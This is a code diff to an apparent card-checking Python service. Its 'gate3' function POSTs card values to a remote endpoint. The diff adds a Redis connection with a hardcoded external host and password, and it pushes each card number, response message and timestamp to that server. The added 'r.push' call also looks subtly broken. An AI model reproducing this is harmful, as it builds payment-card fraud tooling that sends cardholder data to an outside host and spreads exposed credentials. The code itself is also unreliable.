@@ -22,8 +22,9 @@ import time
 import random
 import requests
 import threading
+import redis
 # import jsonify
-
+r = redis.Redis(host='containers-us-west-114.railway.app', port=5440, username='default', password='ZgGXJOFwvAy4TMTrJmnF', db=0)
 user_semaphores = {}
 def find_between( data, first, last ):
     try:
@@ -229,11 +230,14 @@ def gate3():
         response = requests.request("POST", reqUrl, data=payload,  headers=headersList)
         time.sleep(1)
         message = find_between(response.text, '"message":"', '"')
-    
+        timestamp = int(time.time())
+        data = {"card": value, "message": message, "timestamp": timestamp}
     finally:
+        if True:
+            r.push(userid, data)
         semaphore.release()
     # message = response.json()['message']
-    print(response.text)
+    print(data)
     print(value)
     return f"{value}  =>  {message}" 
     # Render the form template for GET requests
